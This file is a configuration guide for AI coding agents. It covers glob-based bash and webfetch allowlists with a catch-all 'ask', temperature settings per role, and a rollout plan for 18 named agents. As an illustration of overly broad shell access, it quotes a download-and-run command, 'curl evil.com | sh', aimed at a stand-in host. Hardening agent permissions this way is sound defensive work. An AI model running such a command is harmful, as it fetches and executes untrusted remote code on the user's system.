---
name: "agent-permission-discipline"
priority: 2
pack: "ai"
triggers:
  - "permission"
  - "temperature"
  - "agent frontmatter"
  - "bash allowlist"
paths:
  - "agents/**"
  - ".claude/agents/**"
---

# Agent Permission + Temperature Discipline

Per-agent frontmatter conventions that surgically scope tool access AND tune response variance to role. Sourced from `pvliesdonk/agents.md` (★3) — small repo, sharp innovation.

## Why surgical permissions beat binary allow/deny

Brian's current agents use `tools: Read, Glob, Grep, Bash` and `disallowedTools: Write, Edit` — binary. But `Bash` is far too broad — a security-reviewer agent should NOT be able to run `rm -rf` or `curl evil.com | sh`, even read-only.

The pvliesdonk pattern: `permission` as a structured object with glob-pattern allowlists per tool.

## Pattern A: `permission.bash` per-glob allowlists

```yaml
---
name: security-reviewer
model: claude-opus-4-7
model_fallback: claude-sonnet-4-6
permission:
  edit: false
  write: false
  bash:
    "git log*": allow
    "git diff*": allow
    "git blame*": allow
    "git show*": allow
    "grep*": allow
    "rg*": allow
    "find*": allow
    "npm audit*": allow
    "npm ls*": allow
    "*": ask  # everything else requires confirmation
  webfetch:
    "https://cve.mitre.org/*": allow
    "https://nvd.nist.gov/*": allow
    "*": ask
---
```

`*` as a catch-all `ask` is critical — anything not on the explicit allowlist prompts. Defense in depth.

## Pattern B: `temperature` per agent role

```yaml
# security-reviewer: minimize hallucination, deterministic
temperature: 0.1

# architect: some creativity in tradeoff analysis
temperature: 0.2

# content-writer: needs variance for tone
temperature: 0.7

# completeness-checker: deterministic — should miss nothing
temperature: 0.1
```

Brian's agents currently inherit default temperature (~0.7 from Sonnet, ~0.3 from Opus thinking mode). Explicitly setting it eliminates variance on verification-style agents that should produce identical findings on identical input.

## Pattern C: multi-model deliberation (adversarial review)

For high-stakes decisions (architecture, security audit), pvliesdonk uses multiple agents from different model families to deliberate:

```yaml
---
name: claude-deliberator
model: claude-opus-4-7
permission: {edit: false, write: false}
---

---
name: gemini-deliberator
model: gemini-2.0-pro  # external via API
permission: {edit: false, write: false}
---

---
name: gpt-deliberator
model: gpt-5  # external via API
permission: {edit: false, write: false}
---
```

Then a "judge" agent reviews all three deliberations and picks the strongest argument. Per `[[ai-seniority]]` — multi-agent diversity review IS code review.

## Apply to Brian's existing 18 agents

| Agent | temperature | permission.bash highlights |
|---|---|---|
| `architect` | 0.2 | git log/diff/show only; no writes (already disallowedTools) |
| `code-simplifier` | 0.3 | npm/pnpm run / tsc / prettier; no rm, no curl, no sudo |
| `completeness-checker` | 0.1 | playwright test, grep, rg; no destructive |
| `deploy-verifier` | 0.1 | curl GET, wrangler tail, playwright; no wrangler deploy |
| `security-reviewer` | 0.1 | as Pattern A above |
| `test-writer` | 0.2 | playwright init/test, vitest, npm run; no deploy |
| `seo-auditor` | 0.2 | curl GET (sites being audited), lighthouse, axe |
| `visual-qa` | 0.2 | playwright only |
| `computer-use-operator` | 0.2 | already isolated by MCP |
| `dependency-auditor` | 0.1 | npm audit, ls, outdated; no install |
| `meta-orchestrator` | 0.3 | full bash (Brian explicitly grants) |
| `migration-agent` | 0.2 | drizzle-kit, wrangler d1, sqlite3 |
| `content-writer` | 0.7 | none (no bash needed) |
| `performance-profiler` | 0.2 | playwright, lighthouse, curl |
| `incident-responder` | 0.3 | git, wrangler logs, kubectl logs, no destructive |
| `accessibility-auditor` | 0.1 | axe, playwright; no destructive |
| `cost-estimator` | 0.1 | wrangler analytics, jq; no destructive |
| `changelog-generator` | 0.3 | git log only |

## Migration discipline

Don't bulk-rewrite all 18 agents at once. Order:
1. **First**: security-reviewer + completeness-checker + deploy-verifier (verification agents — highest leverage)
2. **Second**: dependency-auditor + accessibility-auditor + cost-estimator (read-only audit agents)
3. **Third**: code-simplifier + migration-agent + test-writer (impl agents — temp 0.2-0.3)
4. **Fourth**: rest

Each rewrite gets a paired E2E test asserting the agent still completes its canonical task with the new constraints.

## Cross-link

- `[[ai-seniority]]` — multi-agent diversity review IS code review
- `[[agent-selection]]` — pick the right agent before applying these
- `[[opus-quota-fallback]]` — model_fallback already on Opus-pinned agents
- `[[autonomous-engineering]]` — tier-based authorization
- `[[full-autonomy]]` — when permission `ask` resolves automatically
- `[[secret-provisioning]]` — `permission.bash: "get-secret*: allow"` for agents that need secrets
